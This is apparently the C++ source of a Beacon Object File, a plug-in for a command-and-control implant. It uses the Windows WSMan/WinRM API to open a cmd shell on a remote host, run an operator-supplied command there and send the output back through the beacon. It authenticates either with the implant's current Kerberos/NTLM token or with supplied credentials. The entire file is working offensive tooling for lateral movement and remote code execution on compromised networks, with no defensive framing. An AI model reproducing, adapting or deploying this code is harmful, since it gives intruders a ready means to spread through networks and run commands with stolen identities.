#include <externs.h>

typedef struct {
    HANDLE Event;
    BOOL   HadError;
} CTX_CALLBACK, *PCTX_CALLBACK;

auto WSManShellCompletionFunction(
    PVOID OpsCtx,
    DWORD Flags,
    WSMAN_ERROR* WsmanError,
    WSMAN_SHELL_HANDLE WsmanShell,
    WSMAN_COMMAND_HANDLE WsmanCmd,
    WSMAN_OPERATION_HANDLE OpsHandle,
    WSMAN_RECEIVE_DATA_RESULT* WsmanData
) -> VOID {
    PCTX_CALLBACK CtxOps = (PCTX_CALLBACK)OpsCtx;

    if (!CtxOps) {
        BeaconPrintf(CALLBACK_ERROR, "[x] No context provided (OpsCtx is NULL).");
        return;
    }

    if (WsmanError && WsmanError->code != 0) {
        if (WsmanError->code == ERROR_OPERATION_ABORTED) {
        } else {
            BeaconPrintf(
                CALLBACK_ERROR,
                "[x] WSMan shell creation failed.\n[x] Error code: 0x%X\n[x] Detail: %ls",
                WsmanError->code,
                WsmanError->errorDetail ? WsmanError->errorDetail : L"(no detail provided)"
            );
            CtxOps->HadError = TRUE;
        }
    }

    SetEvent(CtxOps->Event);
}

auto ReceiveCallback(
    PVOID OpsCtx,
    DWORD Flags,
    WSMAN_ERROR* WsmanError,
    WSMAN_SHELL_HANDLE WsmanShell,
    WSMAN_COMMAND_HANDLE WsmanCmd,
    WSMAN_OPERATION_HANDLE OpsHandle,
    WSMAN_RECEIVE_DATA_RESULT* WsmanData
) -> VOID {
    if ( ! OpsCtx ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] No context provided (OpsCtx is NULL)."); 
        return;
    }

    PCTX_CALLBACK CtxOps = (PCTX_CALLBACK)OpsCtx;

    if ( WsmanError && WsmanError->code != 0 ) {
        BeaconPrintf(
            CALLBACK_ERROR,
            "[x] WSMan command execution error. Error code: %lu, Detail: %ls",
            WsmanError->code,
            WsmanError->errorDetail ? WsmanError->errorDetail : L"(no detail provided)"
        );

        CtxOps->HadError = TRUE;
    }

    if ( WsmanData && ( WsmanData->streamData.type & WSMAN_DATA_TYPE_BINARY) && WsmanData->streamData.binaryData.dataLength ) {
        DWORD OutLen = WsmanData->streamData.binaryData.dataLength;
        PCHAR Output = (PCHAR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, OutLen + 1 );
        if ( ! Output ) {
            BeaconPrintf(CALLBACK_ERROR, "[x] HeapAlloc failed. LastError: %lu", GetLastError());
            return;
        }

        HANDLE PipeRead   = INVALID_HANDLE_VALUE;
        HANDLE PipeWrite  = INVALID_HANDLE_VALUE;
        DWORD  BytesRead  = 0;
        DWORD  Written    = 0;

        if ( ! CreatePipe( &PipeRead, &PipeWrite, nullptr, OutLen ) ) {
            BeaconPrintf(CALLBACK_ERROR, "[x] CreatePipe failed. LastError: %lu", GetLastError());
            goto CleanCallback;
        }

        if ( ! WriteFile( PipeWrite, WsmanData->streamData.binaryData.data, OutLen, &Written, nullptr ) ) {
            BeaconPrintf(CALLBACK_ERROR, "[x] WriteFile to pipe failed. LastError: %lu", GetLastError());
            goto CleanCallback;
        }

        if ( ! ReadFile( PipeRead, Output, OutLen, &BytesRead, nullptr ) ) {
            BeaconPrintf(CALLBACK_ERROR, "[x] ReadFile from pipe failed. LastError: %lu", GetLastError());
            goto CleanCallback;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%s", Output);

    CleanCallback:
        if ( ! HeapFree( GetProcessHeap(), 0, Output ) ) {
            BeaconPrintf(CALLBACK_ERROR, "[x] HeapFree failed. LastError: %lu", GetLastError());
        }
        if ( PipeRead  != INVALID_HANDLE_VALUE ) CloseHandle( PipeRead  );
        if ( PipeWrite != INVALID_HANDLE_VALUE ) CloseHandle( PipeWrite );
    }

    if (
        ( WsmanError && WsmanError->code != 0 ) || 
        ( WsmanData  && WsmanData->commandState && wcscmp( WsmanData->commandState, WSMAN_COMMAND_STATE_DONE ) == 0 ) ) 
    {
        SetEvent( CtxOps->Event );
    }
}

EXTERN_C
void go(char* args, int argc) {
    Data DataPsr = { 0 };

    BeaconDataParse( &DataPsr, args, argc );

    WCHAR* Hostname   = (WCHAR*)BeaconDataExtract(&DataPsr, 0);
    WCHAR* Command    = (WCHAR*)BeaconDataExtract(&DataPsr, 0);
    WCHAR* WsUserName = (WCHAR*)BeaconDataExtract(&DataPsr, 0);
    WCHAR* WsPassword = (WCHAR*)BeaconDataExtract(&DataPsr, 0);

    ULONG  Success = TRUE;

    HANDLE EventShellEnd = INVALID_HANDLE_VALUE;
    HANDLE EventReceive  = INVALID_HANDLE_VALUE;

    CTX_CALLBACK CtxCreateShell  = { 0 };
    CTX_CALLBACK CtxReceiveShell = { 0 };

    WSMAN_API_HANDLE       WsmanApi   = { 0 };
    WSMAN_SHELL_HANDLE     WsmanShell = { 0 };
    WSMAN_SHELL_ASYNC      WsManAsync = { 0 };
    WSMAN_SESSION_HANDLE   hSession   = { 0 };
    WSMAN_COMMAND_HANDLE   WsmanCmd   = { 0 };
    WSMAN_OPERATION_HANDLE RecvOps    = { 0 };

    WSMAN_SHELL_ASYNC WsManAsyncShell = { 0 };

    WSMAN_AUTHENTICATION_CREDENTIALS serverAuthenticationCredentials = { 0 };

    auto SafeDeinit = [&]( VOID ) {
        if ( WsmanApi ) {
            Success = WSManDeinitialize( WsmanApi, 0 );
            if ( Success != NO_ERROR )
                BeaconPrintf(CALLBACK_ERROR, "[x] WSManDeinitialize failed. Error code: %ld", Success);
        }
    };

    Success = WSManInitialize( WSMAN_FLAG_REQUESTED_API_VERSION_1_0, &WsmanApi );
    if ( Success != NO_ERROR ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] WSManInitialize failed. Error code: %ld", Success);
        SafeDeinit(); 
        return;
    }

    if ( WsUserName && *WsUserName ) {
        serverAuthenticationCredentials.authenticationMechanism = WSMAN_FLAG_AUTH_NEGOTIATE;
        serverAuthenticationCredentials.userAccount.username = WsUserName;
        serverAuthenticationCredentials.userAccount.password = WsPassword;
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using explicit credentials: %ls", WsUserName);
    } else {
        serverAuthenticationCredentials.authenticationMechanism = WSMAN_FLAG_DEFAULT_AUTHENTICATION;
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Using current authentication (Kerberos/NTLM token)");
    }

    Success = WSManCreateSession( WsmanApi, Hostname, 0, &serverAuthenticationCredentials, nullptr, &hSession );
    if ( Success != NO_ERROR ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] WSManCreateSession failed for host %ls. Error code: %ld", Hostname, Success);
        SafeDeinit(); 
        return;
    }

    EventShellEnd = CreateEventW( nullptr, FALSE, FALSE, nullptr );
    if ( ! EventShellEnd ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] CreateEventW for EventShellEnd failed. LastError: %lu", GetLastError());
        WSManCloseSession( hSession, 0 ); 
        SafeDeinit(); 
        return;
    }

    CtxCreateShell.Event          = EventShellEnd;
    WsManAsync.operationContext   = &CtxCreateShell;
    WsManAsync.completionFunction = &WSManShellCompletionFunction;

    WSManCreateShell( hSession, 0, WSMAN_CMDSHELL_URI, nullptr, nullptr, nullptr, &WsManAsync, &WsmanShell );
    WaitForSingleObject( EventShellEnd, INFINITE );
    if ( CtxCreateShell.HadError ) {
        CloseHandle( EventShellEnd ); 
        WSManCloseSession( hSession, 0 ); 
        SafeDeinit(); 
        return;
    }

    WSManRunShellCommand( WsmanShell, 0, Command, nullptr, nullptr, &WsManAsync, &WsmanCmd );
    WaitForSingleObject( EventShellEnd, INFINITE );
    if ( CtxCreateShell.HadError ) {
        CloseHandle( EventShellEnd ); 
        WSManCloseShell( WsmanShell, 0, &WsManAsync );
        WSManCloseSession( hSession, 0 ); 
        SafeDeinit(); 
        return;
    }

    EventReceive = CreateEventW( nullptr, FALSE, FALSE, nullptr );
    if ( ! EventReceive ) {
        BeaconPrintf(CALLBACK_ERROR, "[x] CreateEventW for EventReceive failed. LastError: %lu", GetLastError());
        CloseHandle( EventShellEnd ); 
        WSManCloseShell( WsmanShell, 0, &WsManAsync );
        WSManCloseSession( hSession, 0 ); 
        SafeDeinit(); 
        return;
    }

    CtxReceiveShell.Event              = EventReceive;
    WsManAsyncShell.operationContext   = &CtxReceiveShell;
    WsManAsyncShell.completionFunction = &ReceiveCallback;

    WSManReceiveShellOutput( WsmanShell, WsmanCmd, 0, nullptr, &WsManAsyncShell, &RecvOps );
    WaitForSingleObject( EventReceive, 30 * 1000 );

    CloseHandle( EventReceive  );
    CloseHandle( EventShellEnd );

    WSManCloseCommand( WsmanCmd, 0, &WsManAsync );
    WSManCloseShell( WsmanShell, 0, &WsManAsync );
    WSManCloseSession( hSession, 0 );
    SafeDeinit();
}